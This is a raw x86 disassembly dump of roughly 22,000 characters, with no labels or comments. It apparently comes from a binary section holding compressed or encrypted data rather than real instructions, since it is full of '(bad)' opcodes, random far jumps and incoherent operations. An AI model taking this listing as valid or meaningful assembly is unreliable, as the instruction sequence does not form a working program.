  41f3b5:	cmp    DWORD PTR [esi-0x1f],ecx
  41f3b8:	xchg   ebx,eax
  41f3b9:	sub    al,0x45
  41f3bb:	in     al,0x59
  41f3bd:	ss inc ecx
  41f3bf:	push   cs
  41f3c0:	loope  0x41f387
  41f3c2:	dec    ebx
  41f3c3:	lahf   
  41f3c4:	clc    
  41f3c5:	inc    edi
  41f3c6:	cmp    DWORD PTR [edi-0x5],esp
  41f3c9:	test   BYTE PTR [esi+0x6e],0x63
  41f3cd:	xchg   BYTE PTR [ecx-0x6b6ac73d],ch
  41f3d3:	(bad)  
  41f3d4:	scas   eax,DWORD PTR es:[edi]
  41f3d5:	xor    ch,BYTE PTR [edx+0x34302d7f]
  41f3db:	and    ecx,ebx
  41f3dd:	push   ds
  41f3de:	push   ss
  41f3df:	mov    dl,0xf5
  41f3e1:	shl    cl,0x8
  41f3e4:	push   ds
  41f3e5:	pushf  
  41f3e6:	xchg   ecx,eax
  41f3e7:	ret    0x2646
  41f3ea:	and    edx,ebx
  41f3ec:	(bad)  
  41f3ed:	xchg   ebp,eax
  41f3ee:	fnsave [ebx]
  41f3f0:	xor    al,0x67
  41f3f2:	jp     0x41f412
  41f3f4:	imul   esp,DWORD PTR [esp+edi*8],0xffffffb2
  41f3f8:	out    0x53,al
  41f3fa:	or     eax,0xf7795ac8
  41f3ff:	loop   0x41f427
  41f401:	cmp    al,0x6e
  41f403:	jb     0x41f425
  41f405:	sub    DWORD PTR [edi-0x3a],0xffffff81
  41f409:	push   ebp
  41f40a:	xor    ecx,ebx
  41f40c:	call   0xd554adda
  41f411:	stos   DWORD PTR es:[edi],eax
  41f412:	sbb    dh,BYTE PTR [ecx]
  41f414:	inc    esp
  41f415:	pop    ecx
  41f416:	mov    cl,0x91
  41f418:	clc    
  41f419:	xchg   BYTE PTR [ecx],cl
  41f41b:	and    edi,DWORD PTR [esi-0x4ccd29d9]
  41f421:	in     al,dx
  41f422:	(bad)  
  41f423:	sahf   
  41f424:	fs jge 0x41f3bc
  41f427:	adc    eax,0x810a70ac
  41f42c:	clc    
  41f42d:	inc    ecx
  41f42e:	add    bl,BYTE PTR [eax+0x51]
  41f431:	jne    0x41f42c
  41f433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f434:	lds    ebp,FWORD PTR [ecx]
  41f436:	jg     0x41f3ca
  41f438:	aam    0xf2
  41f43a:	mov    al,0xf1
  41f43c:	xlat   BYTE PTR ds:[ebx]
  41f43d:	stos   DWORD PTR es:[edi],eax
  41f43e:	loopne 0x41f44d
  41f440:	es test eax,0x2123053a
  41f446:	xchg   ebx,eax
  41f447:	sbb    al,0xd2
  41f449:	mov    esp,DWORD PTR [ebx]
  41f44b:	call   0xf3c1bff9
  41f450:	(bad)  
  41f451:	int3   
  41f452:	or     al,BYTE PTR [esi]
  41f454:	mov    eax,ds:0x4eb5a347
  41f459:	daa    
  41f45a:	pop    edx
  41f45b:	push   0x54
  41f45d:	shl    DWORD PTR [esi],1
  41f45f:	shl    bl,1
  41f461:	xchg   ah,dl
  41f463:	cmp    dl,al
  41f465:	mov    ds:0x682d972,eax
  41f46a:	int3   
  41f46b:	inc    ebx
  41f46c:	add    esp,DWORD PTR [esi]
  41f46e:	sub    bh,0x34
  41f471:	mov    al,ds:0xef148a2a
  41f476:	in     al,dx
  41f477:	cmc    
  41f478:	jbe    0x41f4f2
  41f47a:	and    al,0x65
  41f47c:	pop    esp
  41f47d:	addr16 inc esi
  41f47f:	dec    edx
  41f480:	mov    ah,ch
  41f482:	adc    BYTE PTR [ecx+0x47],ch
  41f485:	jle    0x41f49e
  41f487:	dec    ebx
  41f488:	pop    es
  41f489:	pop    esp
  41f48a:	popa   
  41f48b:	push   edi
  41f48c:	xor    eax,0x7e9c1d28
  41f491:	cmp    eax,0x4e64ff2d
  41f496:	pusha  
  41f497:	cmp    DWORD PTR [ebp-0x65],0xffffff92
  41f49b:	xchg   esp,eax
  41f49c:	mov    bh,0x45
  41f49e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f49f:	cmc    
  41f4a0:	mov    ebp,0xfbf396d
  41f4a5:	inc    ebp
  41f4a6:	sbb    esi,DWORD PTR [eax-0x57]
  41f4a9:	adc    eax,0x5d1598a1
  41f4ae:	add    esp,DWORD PTR [ebx-0x32ae3543]
  41f4b4:	mov    al,0x4a
  41f4b6:	shr    DWORD PTR [ebx+edx*8],0x74
  41f4ba:	mov    al,0x44
  41f4bc:	cdq    
  41f4bd:	sub    cl,cl
  41f4bf:	sub    dl,cl
  41f4c1:	fisubr DWORD PTR [esi+0x5f90184e]
  41f4c7:	in     eax,dx
  41f4c8:	adc    esp,DWORD PTR [edi]
  41f4ca:	jmp    0x41f504
  41f4cc:	je     0x41f522
  41f4ce:	pop    ecx
  41f4cf:	fisubr DWORD PTR [ebp-0x53]
  41f4d2:	dec    ebp
  41f4d3:	mov    eax,0x831e70c4
  41f4d8:	lds    edi,FWORD PTR [ecx-0x46]
  41f4db:	xor    BYTE PTR [ecx],bl
  41f4dd:	in     al,0x6b
  41f4df:	or     ch,cl
  41f4e1:	jns    0x41f47a
  41f4e3:	jmp    0xb5a221ed
  41f4e8:	ins    DWORD PTR es:[edi],dx
  41f4e9:	fadd   DWORD PTR [ecx-0x45]
  41f4ec:	inc    esi
  41f4ed:	and    edx,DWORD PTR [esp+edi*2+0x1688ae97]
  41f4f4:	mov    al,0x39
  41f4f6:	mov    ebx,0xd0ec9be2
  41f4fb:	iret   
  41f4fc:	jb     0x41f51f
  41f4fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4ff:	xchg   edi,eax
  41f500:	sti    
  41f501:	pop    edx
  41f502:	jns    0x41f4fd
  41f504:	fstp   TBYTE PTR [ebx+0x70342d03]
  41f50a:	push   ss
  41f50b:	cmp    BYTE PTR [edx+edx*2+0x1647f44e],al
  41f512:	(bad)  
  41f513:	mov    ebp,DWORD PTR [edi]
  41f515:	mov    eax,0xfbc4dd91
  41f51a:	pop    eax
  41f51b:	and    ch,BYTE PTR [ebx-0x51]
  41f51e:	loop   0x41f508
  41f520:	inc    ecx
  41f521:	int    0x88
  41f523:	jmp    0x48688667
  41f528:	pop    ss
  41f529:	push   es
  41f52a:	cwde   
  41f52b:	js     0x41f598
  41f52d:	mov    al,0x60
  41f52f:	fsub   DWORD PTR [ebx+0x73]
  41f532:	fs push 0xffffffa0
  41f535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f536:	neg    bl
  41f538:	daa    
  41f539:	sbb    eax,0xaddea5e3
  41f53e:	shl    DWORD PTR [ecx+0x55871115],1
  41f544:	call   0x5a143ff9
  41f549:	sub    BYTE PTR [esp+eiz*8+0x3b07c748],cl
  41f550:	test   eax,0xee9e1fdc
  41f555:	sub    al,0xa7
  41f557:	int    0x8
  41f559:	pop    eax
  41f55a:	sub    dl,BYTE PTR [edx-0x66]
  41f55d:	sub    BYTE PTR [edi+0x4cfcc2bf],dl
  41f563:	div    ch
  41f565:	(bad)  
  41f566:	jbe    0x41f4eb
  41f568:	cmp    al,0xa8
  41f56a:	in     eax,0x9e
  41f56c:	push   cs
  41f56d:	cmp    DWORD PTR [esi-0x5a],edx
  41f570:	or     DWORD PTR [esi-0x6e],ebp
  41f573:	mov    dl,0x5f
  41f575:	pop    esi
  41f576:	push   esi
  41f577:	icebp  
  41f578:	adc    cl,BYTE PTR [eiz*4-0x3f722e2c]
  41f57f:	push   0x86e9a802
  41f584:	out    0xa8,eax
  41f586:	add    BYTE PTR [esi+0x0],0xc2
  41f58a:	mov    ds:0xeb3186d,al
  41f58f:	cmp    dh,ah
  41f591:	mov    es,WORD PTR [esi+0x57e2b5cc]
  41f597:	pop    esp
  41f598:	shl    ebx,cl
  41f59a:	mov    ah,0xbe
  41f59c:	mov    al,BYTE PTR [ecx]
  41f59e:	jl     0x41f5ed
  41f5a0:	sub    al,0x2d
  41f5a2:	or     BYTE PTR [ecx+edx*1+0x8020ee9],al
  41f5a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5aa:	or     esp,DWORD PTR [esi+0x15ca1f5a]
  41f5b0:	cld    
  41f5b1:	sahf   
  41f5b2:	mov    dh,0xe4
  41f5b4:	into   
  41f5b5:	sbb    BYTE PTR [ebp+0x6a],bl
  41f5b8:	retf   0x251e
  41f5bb:	jmp    0x41f5c4
  41f5bd:	rcr    BYTE PTR ds:0x4d84eacd,1
  41f5c3:	sub    BYTE PTR [eax-0x5c69ccd6],ch
  41f5c9:	add    esi,0xf2d3dd9a
  41f5cf:	test   eax,0x60212b0d
  41f5d4:	jmp    0x8d45:0x82b2dbc0
  41f5db:	jne    0x41f581
  41f5dd:	cmp    al,0x8d
  41f5df:	nop
  41f5e0:	mov    ebp,0xec3ee61e
  41f5e5:	les    esi,FWORD PTR [edx-0x62a4196c]
  41f5eb:	adc    dl,BYTE PTR [ebx+0x7a79d331]
  41f5f1:	sahf   
  41f5f2:	cmp    eax,0x80923a65
  41f5f7:	mov    BYTE PTR [eax],ah
  41f5f9:	test   eax,0xff3020bf
  41f5fe:	ja     0x41f67a
  41f600:	or     al,0xe2
  41f602:	cdq    
  41f603:	push   esi
  41f604:	add    eax,DWORD PTR [ebx-0x6a132d07]
  41f60a:	pmulhw mm5,mm0
  41f60d:	and    eax,DWORD PTR [ebp-0x2]
  41f610:	pop    ds
  41f611:	leave  
  41f612:	cli    
  41f613:	(bad)
  41f617:	sub    ecx,DWORD PTR [ebx+0x2d93536e]
  41f61d:	test   BYTE PTR [edx+0x1de367f4],al
  41f623:	sbb    BYTE PTR [eax+0x3f],bh
  41f626:	and    esp,ecx
  41f628:	scas   eax,DWORD PTR es:[edi]
  41f629:	push   edx
  41f62a:	adc    al,0xa6
  41f62c:	jne    0x41f5e9
  41f62e:	pop    esp
  41f62f:	and    DWORD PTR ds:0x35482f60,0xbccccdf8
  41f639:	sbb    al,0x58
  41f63b:	cwde   
  41f63c:	(bad)  
  41f63d:	aaa    
  41f63e:	outs   dx,DWORD PTR ds:[esi]
  41f63f:	les    ecx,FWORD PTR ds:0x29acf89b
  41f645:	jg     0x41f5ed
  41f647:	mov    edi,0x4aa0c520
  41f64c:	push   edi
  41f64d:	sub    BYTE PTR [ecx+0x14a20c10],bl
  41f653:	and    dl,BYTE PTR [edi]
  41f655:	rcl    DWORD PTR [edx+0x31cab9a5],1
  41f65b:	add    esp,DWORD PTR [edx-0x47]
  41f65e:	cdq    
  41f65f:	outs   dx,BYTE PTR ds:[esi]
  41f660:	mov    eax,ds:0x57e80cf4
  41f665:	js     0x41f654
  41f667:	inc    esp
  41f668:	outs   dx,DWORD PTR ds:[esi]
  41f669:	scas   al,BYTE PTR es:[edi]
  41f66a:	leave  
  41f66b:	jge    0x41f683
  41f66d:	push   ebx
  41f66e:	xchg   edx,eax
  41f66f:	out    0x63,eax
  41f671:	jb     0x41f62d
  41f673:	sub    dh,BYTE PTR [ebx]
  41f675:	into   
  41f676:	ins    BYTE PTR es:[edi],dx
  41f677:	leave  
  41f678:	mov    eax,ds:0xea5d668d
  41f67d:	loop   0x41f63d
  41f67f:	out    0x31,eax
  41f681:	and    eax,0xfae1a006
  41f686:	or     eax,0xc4836ea1
  41f68b:	pop    eax
  41f68c:	jl     0x41f6bc
  41f68e:	std    
  41f68f:	dec    edi
  41f690:	cmp    DWORD PTR [eax+0x138f55e9],esi
  41f696:	outs   dx,BYTE PTR ds:[esi]
  41f697:	sti    
  41f698:	mul    BYTE PTR ds:[eax-0x66aa6718]
  41f69f:	lea    ebx,[eax-0x4e]
  41f6a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6a3:	dec    ebp
  41f6a4:	lahf   
  41f6a5:	sbb    ebp,ecx
  41f6a7:	jns    0x41f695
  41f6a9:	jle    0x41f669
  41f6ab:	dec    ebx
  41f6ac:	ins    DWORD PTR es:[edi],dx
  41f6ad:	inc    ebp
  41f6ae:	mov    ebp,0x408a0eed
  41f6b3:	mov    eax,0x6f7b60b
  41f6b8:	loopne 0x41f6ff
  41f6ba:	(bad)
  41f6bd:	sbb    al,BYTE PTR [edx-0x2f]
  41f6c0:	jecxz  0x41f657
  41f6c2:	imul   ebx,DWORD PTR [edx+0x6c],0x3b
  41f6c6:	lahf   
  41f6c7:	sub    bh,al
  41f6c9:	adc    BYTE PTR [eax],al
  41f6cb:	push   ebp
  41f6cc:	(bad)  
  41f6cd:	popa   
  41f6ce:	fdivrp st(3),st
  41f6d0:	xor    BYTE PTR [edx-0x12],0x28
  41f6d4:	scas   eax,DWORD PTR es:[edi]
  41f6d5:	lods   eax,DWORD PTR ss:[esi]
  41f6d7:	sti    
  41f6d8:	ss stos BYTE PTR es:[edi],al
  41f6da:	xor    bl,BYTE PTR [ebp+0x39]
  41f6dd:	dec    ebx
  41f6de:	or     BYTE PTR [edx-0x5b0b6c6b],al
  41f6e4:	push   esp
  41f6e5:	mov    al,0xde
  41f6e7:	ret    0xf9bf
  41f6ea:	push   eax
  41f6eb:	jns    0x41f73a
  41f6ed:	imul   ebx,DWORD PTR [edx],0xd57fca9b
  41f6f3:	loope  0x41f697
  41f6f5:	repnz and edi,edx
  41f6f8:	add    al,0xfd
  41f6fa:	in     eax,dx
  41f6fb:	push   esp
  41f6fc:	enter  0xb6c6,0x6e
  41f700:	ror    edi,cl
  41f702:	pop    ebx
  41f703:	adc    ebx,DWORD PTR [edx]
  41f705:	out    0x84,al
  41f707:	or     al,0xf2
  41f709:	hlt    
  41f70a:	xchg   esp,eax
  41f70b:	sub    ecx,DWORD PTR [ecx+0x7]
  41f70e:	mov    BYTE PTR [ebx+0x2f],dl
  41f711:	retf   0xf62f
  41f714:	fild   QWORD PTR ds:0xf7fdeb39
  41f71a:	scas   eax,DWORD PTR es:[edi]
  41f71b:	repz push eax
  41f71d:	push   0xb4b16dca
  41f722:	xor    BYTE PTR [edi],cl
  41f724:	inc    ecx
  41f725:	dec    BYTE PTR [ebp-0x24]
  41f728:	call   0x4222:0x22db4658
  41f72f:	mov    bh,0x69
  41f731:	mov    BYTE PTR [edi],bl
  41f733:	pusha  
  41f734:	hlt    
  41f735:	push   0xffffffe9
  41f737:	and    DWORD PTR ds:0x1aad537b,0xf75fae7b
  41f741:	jp     0x41f71f
  41f743:	rcr    edi,cl
  41f745:	pop    esi
  41f746:	sahf   
  41f747:	in     al,0xa0
  41f749:	inc    ebx
  41f74a:	cmp    al,0xf6
  41f74c:	jge    0x41f6da
  41f74e:	(bad)  [ebp+0x62f81a16]
  41f754:	pop    ebx
  41f755:	in     al,dx
  41f756:	and    BYTE PTR [edi],dl
  41f758:	sub    al,0x3e
  41f75a:	mov    ds:0x151769ff,al
  41f760:	je     0x41f7ba
  41f762:	jge    0x41f6fc
  41f764:	dec    eax
  41f765:	sub    eax,0x8432f4fe
  41f76a:	cmc    
  41f76b:	leave  
  41f76c:	and    eax,0x67d97d23
  41f771:	jbe    0x41f74f
  41f773:	jnp    0x41f78e
  41f775:	sub    esi,ebx
  41f777:	pop    esi
  41f778:	and    edi,edi
  41f77a:	jp     0x41f702
  41f77c:	mov    ch,0x58
  41f77e:	repz ss sbb bh,dl
  41f782:	xchg   ecx,eax
  41f783:	sbb    al,0xd
  41f785:	retf   0x1b60
  41f788:	fmul   DWORD PTR [edx+esi*8-0x6288725f]
  41f78f:	mov    eax,0x5fbe9c9a
  41f794:	pop    ebp
  41f795:	sub    eax,DWORD PTR [edi+0x4a]
  41f798:	retf   
  41f799:	and    eax,0x743de506
  41f79e:	ins    DWORD PTR es:[edi],dx
  41f79f:	pop    esi
  41f7a0:	or     edi,0xffffffcd
  41f7a3:	fcmove st,st(0)
  41f7a5:	push   edx
  41f7a6:	mov    edi,0xd8761299
  41f7ab:	sbb    DWORD PTR [edx-0x3],ebp
  41f7ae:	scas   eax,DWORD PTR es:[edi]
  41f7af:	ins    DWORD PTR es:[edi],dx
  41f7b0:	xor    al,0x29
  41f7b2:	sub    esp,DWORD PTR [edi+0x29872e7b]
  41f7b8:	lods   al,BYTE PTR ds:[esi]
  41f7b9:	xor    edi,DWORD PTR ds:0x9aa4cc15
  41f7bf:	xor    bh,al
  41f7c1:	jbe    0x41f7f7
  41f7c3:	repnz cmp eax,0xba0c7da4
  41f7c9:	mov    ecx,0x98d67295
  41f7ce:	sbb    al,0x98
  41f7d0:	pop    ds
  41f7d1:	push   0xffffffda
  41f7d3:	mov    esp,esp
  41f7d5:	sbb    ebx,ecx
  41f7d7:	neg    ch
  41f7d9:	js     0x41f82f
  41f7db:	mov    esp,0xa62d632c
  41f7e0:	cmp    cl,BYTE PTR [ebp-0x30177d6f]
  41f7e6:	push   edx
  41f7e7:	je     0x41f7c7
  41f7e9:	push   ss
  41f7ea:	mov    ecx,0x101ac03d
  41f7ef:	outs   dx,BYTE PTR ds:[esi]
  41f7f0:	fimul  WORD PTR [ebp-0x4d]
  41f7f3:	cli    
  41f7f4:	sahf   
  41f7f5:	in     al,dx
  41f7f6:	jns    0x41f7ed
  41f7f8:	test   al,0x28
  41f7fa:	bswap  esi
  41f7fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7fd:	lahf   
  41f7fe:	(bad)  [ebp+0x46e8890d]
  41f804:	push   ebp
  41f805:	mov    edx,0xd714e990
  41f80a:	mov    bh,BYTE PTR [edi]
  41f80c:	mov    al,0x49
  41f80e:	or     ebx,DWORD PTR [edx-0x36]
  41f811:	jbe    0x41f7c6
  41f813:	fmul   DWORD PTR [edi+0x28]
  41f816:	inc    eax
  41f817:	add    edx,DWORD PTR [edi+ebp*1]
  41f81a:	push   0xfffffff9
  41f81c:	or     bl,dl
  41f81e:	shr    ah,0x16
  41f821:	stos   BYTE PTR es:[edi],al
  41f822:	and    DWORD PTR [edi],edx
  41f824:	adc    al,0x67
  41f827:	fidiv  DWORD PTR [ebx-0x6e864b8e]
  41f82d:	loope  0x41f897
  41f82f:	push   0x7134c2f3
  41f834:	ds ds mov dh,0x81
  41f838:	(bad)  
  41f839:	aaa    
  41f83a:	or     ah,ah
  41f83c:	and    BYTE PTR [ebx],0x17
  41f83f:	cdq    
  41f840:	rol    ebx,1
  41f842:	lds    esp,FWORD PTR [edi]
  41f844:	aas    
  41f845:	mov    WORD PTR [edi+0x5469242c],ss
  41f84b:	into   
  41f84c:	mov    dl,0x9c
  41f84e:	xchg   edx,eax
  41f84f:	mov    bh,0x2f
  41f851:	test   bl,ch
  41f853:	xchg   edi,eax
  41f854:	jp     0x41f83a
  41f856:	ss (bad) 
  41f859:	jnp    0x41f841
  41f85b:	mov    BYTE PTR [esi],bh
  41f85d:	jb     0x41f81f
  41f85f:	mov    esi,0x63d16f5d
  41f864:	mov    ebx,0x6c4f4a08
  41f869:	(bad)  
  41f86a:	cli    
  41f86b:	mov    ecx,0x9c385df4
  41f870:	push   ebx
  41f871:	mov    esp,eax
  41f873:	retf   0xaf65
  41f876:	scas   al,BYTE PTR es:[edi]
  41f877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f878:	int3   
  41f879:	push   esi
  41f87a:	push   esp
  41f87b:	inc    esp
  41f87c:	xchg   ebx,eax
  41f87d:	xchg   ebx,eax
  41f87e:	lds    edx,FWORD PTR [edi+0x4b]
  41f881:	inc    esp
  41f882:	icebp  
  41f883:	icebp  
  41f884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f885:	(bad)  
  41f886:	and    DWORD PTR [ebp+0xf1487c1],ecx
  41f88c:	ins    BYTE PTR es:[edi],dx
  41f88d:	(bad)  
  41f88f:	lahf   
  41f890:	imul   edi,DWORD PTR [edx+0x45],0x19de2aab
  41f897:	cmp    eax,0x6bf1376f
  41f89d:	mov    esi,DWORD PTR [esi-0x3b473e66]
  41f8a3:	dec    ecx
  41f8a4:	repnz sbb DWORD PTR [ebp-0x23dc86ad],esp
  41f8ab:	repnz mov edi,0x4d3dfe40
  41f8b1:	xor    edx,esi
  41f8b3:	push   ds
  41f8b4:	ret    0x115a
  41f8b7:	mov    al,0xc1
  41f8b9:	cmp    eax,0xf4b846a8
  41f8be:	mov    cs,WORD PTR [edx+0x16441a1a]
  41f8c4:	jmp    0xf846:0x757c62a1
  41f8cb:	mov    ecx,0xf1d91a42
  41f8d0:	sahf   
  41f8d1:	(bad)  
  41f8d2:	mov    esp,0x7c8d86d2
  41f8d7:	jne    0x41f8fa
  41f8d9:	scas   al,BYTE PTR es:[edi]
  41f8da:	call   0xfa89:0xaff9544c
  41f8e1:	shl    DWORD PTR [eax+0x6b89f472],1
  41f8e7:	sub    cl,al
  41f8e9:	aaa    
  41f8ea:	push   0x4d09155d
  41f8ef:	daa    
  41f8f0:	dec    edi
  41f8f1:	fmul   QWORD PTR [eax-0xb8d43a4]
  41f8f7:	in     eax,0xe8
  41f8f9:	jge    0x41f927
  41f8fb:	jp     0x41f898
  41f8fd:	sbb    ah,BYTE PTR [esp+edx*2-0x77]
  41f901:	out    0x62,eax
  41f903:	loopne 0x41f8d7
  41f905:	stos   BYTE PTR es:[edi],al
  41f906:	lea    ecx,[edx-0x66839ee1]
  41f90c:	hlt    
  41f90d:	pop    esi
  41f90e:	lea    eax,[edx-0x189faee5]
  41f914:	push   ebp
  41f915:	adc    BYTE PTR [eax+0x48776cd1],ah
  41f91b:	in     eax,0x10
  41f91d:	scas   eax,DWORD PTR es:[edi]
  41f91e:	lds    esp,FWORD PTR [bx+0x71]
  41f922:	js     0x41f8d3
  41f924:	out    0x5d,eax
  41f926:	gs ins DWORD PTR es:[edi],dx
  41f928:	fist   WORD PTR [eax]
  41f92a:	cld    
  41f92b:	nop
  41f92c:	add    BYTE PTR [ebx],dh
  41f92e:	xor    al,0xbe
  41f930:	scas   eax,DWORD PTR es:[edi]
  41f931:	mov    dh,BYTE PTR [eax-0x7525a04]
  41f937:	icebp  
  41f938:	xor    eax,0xc2507313
  41f93d:	cmp    esi,DWORD PTR [edx+esi*1]
  41f940:	inc    esp
  41f941:	cmc    
  41f942:	in     eax,dx
  41f943:	and    eax,DWORD PTR [edi+edi*8]
  41f946:	les    ebp,FWORD PTR fs:[edi-0x5e038bd5]
  41f94d:	dec    edx
  41f94e:	sub    DWORD PTR [ecx],edx
  41f950:	mov    bl,BYTE PTR [edx]
  41f952:	jmp    0x2634036
  41f957:	popa   
  41f958:	or     DWORD PTR [esi+ebp*1-0x7452478],esp
  41f95f:	sti    
  41f960:	jno    0x41f9c2
  41f962:	inc    BYTE PTR [edx+0x46d61066]
  41f968:	loope  0x41f8fa
  41f96a:	jne    0x41f982
  41f96c:	inc    ecx
  41f96d:	jne    0x41f957
  41f96f:	pop    esi
  41f970:	aaa    
  41f971:	and    ebp,DWORD PTR [eax-0x54]
  41f974:	mov    esi,0x33fee475
  41f979:	out    0xec,al
  41f97b:	mov    edi,0xe00e4e7e
  41f980:	imul   esi,DWORD PTR [eax],0x60
  41f983:	pusha  
  41f984:	ins    BYTE PTR es:[edi],dx
  41f985:	dec    edi
  41f986:	mov    cs,edi
  41f988:	push   eax
  41f989:	mov    eax,0x1cac1f2f
  41f98e:	leave  
  41f98f:	cwde   
  41f990:	popa   
  41f991:	xchg   ebp,eax
  41f992:	test   eax,0xec8b57e2
  41f997:	xchg   BYTE PTR [eax],dl
  41f999:	(bad)  
  41f99a:	adc    BYTE PTR [ebx-0x1d],ah
  41f99d:	mov    ah,0x2c
  41f99f:	mov    eax,0xbcb0b655
  41f9a4:	fld    st(6)
  41f9a6:	inc    esi
  41f9a7:	mov    esp,0x5aa2d593
  41f9ac:	lahf   
  41f9ad:	mov    esi,0x85301cc4
  41f9b2:	push   es
  41f9b3:	lods   eax,DWORD PTR ds:[esi]
  41f9b4:	pinsrw mm2,eax,0x34
  41f9b8:	call   0x67a8:0xb7bdfd40
  41f9bf:	jp     0x41f975
  41f9c1:	cwde   
  41f9c2:	aaa    
  41f9c3:	arpl   WORD PTR [edi-0x5d],bp
  41f9c6:	(bad)  
  41f9c8:	sahf   
  41f9c9:	and    dh,bl
  41f9cb:	push   ebx
  41f9cc:	hlt    
  41f9cd:	push   eax
  41f9ce:	sbb    dh,BYTE PTR [ebx]
  41f9d0:	sbb    edi,DWORD PTR [ecx]
  41f9d2:	aaa    
  41f9d3:	fs aas 
  41f9d5:	cmc    
  41f9d6:	(bad)  
  41f9d7:	adc    esi,edx
  41f9d9:	pop    ds
  41f9da:	adc    BYTE PTR [eax+0x76],cl
  41f9dd:	(bad)  
  41f9de:	adc    al,0xb3
  41f9e0:	add    BYTE PTR ds:0x93d817b8,dl
  41f9e6:	out    0x37,al
  41f9e8:	inc    edx
  41f9e9:	popf   
  41f9ea:	inc    esp
  41f9eb:	outs   dx,BYTE PTR ds:[esi]
  41f9ec:	and    DWORD PTR [ebx-0x7aaa4dc],eax
  41f9f2:	(bad)  
  41f9f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9f5:	adc    ebx,DWORD PTR [ebx+esi*4]
  41f9f8:	pushf  
  41f9f9:	cmp    bh,BYTE PTR [ecx+0x509d6666]
  41f9ff:	fidiv  DWORD PTR [eax-0x29]
  41fa02:	sub    eax,0x83a6a085
  41fa07:	mov    dl,0x51
  41fa09:	in     al,dx
  41fa0a:	pusha  
  41fa0b:	sub    edx,ebp
  41fa0d:	cmp    ch,bl
  41fa0f:	xor    dl,BYTE PTR [edx+0x24]
  41fa12:	jne    0x41fa15
  41fa14:	jle    0x41f9ec
  41fa16:	in     eax,0x5f
  41fa18:	or     dh,bh
  41fa1a:	repz xchg esp,eax
  41fa1c:	scas   al,BYTE PTR es:[edi]
  41fa1d:	jp     0x41f9f0
  41fa1f:	fcom   QWORD PTR [esi+esi*8]
  41fa22:	xchg   ecx,ebp
  41fa24:	mov    al,ds:0xc488ce10
  41fa29:	scas   al,BYTE PTR es:[edi]
  41fa2a:	aas    
  41fa2b:	mov    bl,0xda
  41fa2d:	jno    0x41f9cf
  41fa2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa30:	add    DWORD PTR [eax-0x1b],ebx
  41fa33:	mov    dh,0xc4
  41fa35:	adc    dl,bl
  41fa37:	inc    ebx
  41fa38:	mov    al,0xe6
  41fa3a:	add    DWORD PTR [edx-0x7b],ebp
  41fa3d:	sub    al,0x43
  41fa3f:	addr16 into 
  41fa41:	imul   ecx,DWORD PTR [edx],0x1d30749d
  41fa47:	adc    DWORD PTR [eax],ebx
  41fa49:	(bad)
  41fa4c:	sbb    DWORD PTR [edx],esp
  41fa4e:	outs   dx,DWORD PTR ds:[esi]
  41fa4f:	mov    edx,0x2de1e39f
  41fa54:	dec    esp
  41fa55:	or     DWORD PTR [ecx+0x75],ebp
  41fa58:	sub    al,0x7e
  41fa5a:	ror    BYTE PTR ds:0xff7c793a,1
  41fa60:	fsubr  QWORD PTR [esi]
  41fa62:	push   es
  41fa63:	ss dec esi
  41fa65:	mov    eax,0x6171f33a
  41fa6a:	bound  ecx,QWORD PTR [ebx+ecx*1-0x4f58420f]
  41fa71:	dec    edx
  41fa72:	and    BYTE PTR [eax],al
  41fa74:	cs neg ecx
  41fa77:	jb     0x41fa3b
  41fa79:	or     DWORD PTR [esi],esp
  41fa7b:	mov    ebx,DWORD PTR [ebp-0x7d7e7b2a]
  41fa81:	int    0xe9
  41fa83:	pop    ss
  41fa84:	leave  
  41fa85:	fisub  WORD PTR [esi-0x1e5d3fc4]
  41fa8b:	xor    DWORD PTR [ebx],ebx
  41fa8d:	mov    cl,0x8c
  41fa8f:	mov    eax,0x2ca11c1f
  41fa94:	sti    
  41fa95:	pop    es
  41fa96:	cmp    BYTE PTR [edi-0x6cf8c465],0xa0
  41fa9d:	sbb    al,BYTE PTR [edi]
  41fa9f:	inc    ebp
  41faa0:	xchg   edx,eax
  41faa1:	retf   
  41faa2:	cmp    eax,0x621e8d7b
  41faa7:	xchg   edx,eax
  41faa8:	fadd   QWORD PTR [edi+esi*2-0x710bdfcc]
  41faaf:	mov    bh,0xfc
  41fab1:	into   
  41fab2:	cwde   
  41fab3:	iret   
  41fab4:	inc    edx
  41fab5:	into   
  41fab6:	push   eax
  41fab7:	sub    edx,DWORD PTR [ebp-0x123247f6]
  41fabd:	and    esp,esp
  41fabf:	stc    
  41fac0:	les    ebp,FWORD PTR [ebx+eax*2]
  41fac3:	dec    ebx
  41fac4:	push   ecx
  41fac5:	pushf  
  41fac6:	fucom  st(1)
  41fac8:	cmp    bh,bl
  41faca:	adc    al,0x40
  41facc:	inc    esi
  41facd:	shl    BYTE PTR [ebx],1
  41facf:	xchg   ebx,eax
  41fad0:	mov    ds:0x808b3d56,eax
  41fad5:	jecxz  0x41fa6b
  41fad7:	outs   dx,DWORD PTR ds:[esi]
  41fad8:	cwde   
  41fad9:	cmp    BYTE PTR [edi+0x38],dh
  41fadc:	push   ds
  41fadd:	mov    cl,0x30
  41fadf:	arpl   WORD PTR [edi-0x61],ax
  41fae2:	or     al,BYTE PTR [ebx-0x30]
  41fae5:	mov    cl,0x95
  41fae7:	mov    WORD PTR [esi-0x36],?
  41faea:	jecxz  0x41fac4
  41faec:	mov    ah,0x89
  41faee:	scas   eax,DWORD PTR es:[edi]
  41faef:	jp     0x41fb3a
  41faf1:	dec    esi
  41faf2:	mov    edi,0xc3b56d2a
  41faf7:	dec    ebp
  41faf8:	stc    
  41faf9:	scas   al,BYTE PTR es:[edi]
  41fafa:	cmc    
  41fafb:	cmp    ah,BYTE PTR [ebp+0xad2180e]
  41fb01:	inc    ebp
  41fb02:	add    eax,0x1988cea6
  41fb07:	jle    0x41faa5
  41fb09:	aad    0x40
  41fb0b:	push   es
  41fb0c:	pop    edx
  41fb0d:	hlt    
  41fb0e:	dec    ecx
